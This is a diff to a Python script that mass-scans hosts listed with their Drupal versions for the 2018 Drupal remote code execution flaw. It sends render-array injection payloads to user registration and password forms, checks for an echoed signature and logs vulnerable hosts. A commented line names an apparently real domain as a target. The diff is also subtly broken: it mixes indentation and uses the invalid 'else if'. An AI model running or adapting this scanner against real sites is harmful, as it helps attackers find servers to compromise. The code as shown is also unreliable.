@@ -8,6 +8,7 @@ import urllib3
 from functools import partial
 from random import randint
 from multiprocessing import Pool
+import bb01_ultilities as ulti
 
 start = time.time()
 urllib3.disable_warnings()
@@ -42,26 +43,16 @@ def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
 
 def isFormValid(host, version, headers):
     form_id = 'user/password' if version[:1] == '7' else 'user/register'
-    # check form with ?q
-    url = host + '?q=' + form_id
+	urlq = host + '?q=' +form_id
+	url  = host +form_id
     # print url
-    try:
-        r = requests.get(url, headers=headers, timeout=5)
-    except :
-        print url + ' : Fail request'
-        # with open(outputfile, 'a') as f:
-        #     f.write("%s === Request Fail ===\n" % host.encode("utf-8"))
-        return False
-    
-    if (r.status_code == 200):
-        return True
-    # check form without ?q
-    url = host + form_id
-    # print url
-    r = requests.get(url, headers=headers, timeout=5)
-    if (r.status_code == 200):
-        return True
-    print "Form not valid"
+	redirectURL =  ulti.isURLRedirected(url)
+	
+	if(redirectURL != False):
+		return redirectURL
+
+	if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
+		return True
     return False
 
 
@@ -75,7 +66,7 @@ def isPwnAble_2018(host, version, headers):
                        '_triggering_element_name': 'name'}
         try:
             r = requests.post(host, data=post_params,
-                    params=get_params, verify=False, headers=headers, timeout=5)
+                    params=get_params, verify=False, headers=headers, timeout=1)
         except :
             return False
         m = re.search(
@@ -85,8 +76,8 @@ def isPwnAble_2018(host, version, headers):
             get_params = {'q': 'file/ajax/name/#value/' + found}
             post_params = {'form_build_id': found}
             res = requests.post(host, data=post_params,
-                                params=get_params, headers=headers, timeout=5)
-            detect = re.search(signature, res.text)
+                                params=get_params, headers=headers, timeout=1)
+            detect = bool(re.search(signature, res.text))
             if detect:
                 return True
         else:
@@ -97,11 +88,11 @@ def isPwnAble_2018(host, version, headers):
                        'mail[a][#type]': 'markup', 'mail[a][#markup]': ' echo ' + signature}
         try:
             r = requests.post(host, data=post_params,
-                    verify=False, headers=headers, timeout=5)
+                    verify=False, headers=headers, timeout=1)
         except:
             return False
 
-        m = re.search(signature, r.text)
+        m = bool(re.search(signature, r.text))
         if m:
             return True
         else:
@@ -116,6 +107,7 @@ def isVulnerable(lines):
     # print host
     version = lines.strip().split("|")[1]
     # print('Form Valid: ', isFormValid(host, version, headers))
+    
     formValid = isFormValid(host, version, headers)
     if (formValid == True):
         isPwned = isPwnAble_2018(host, version, headers) 
@@ -125,10 +117,12 @@ def isVulnerable(lines):
         else:
             with open(outputfile, 'a') as f:
                 f.write("%s === Vuln Fail ===\n" % host.encode("utf-8"))
-    else:
+    else if (formValid == False):
         with open(outputfile, 'a') as f:
             f.write("%s === Form Fail ===\n" % host.encode("utf-8"))
-
+    else:
+        with open(outputfile, 'a') as f:
+            f.write("%s === Redirected ===\n" % host.encode("utf-8"))
 if __name__ == "__main__":
     # lines = 'argusme.com|7.44'
     # version = ''
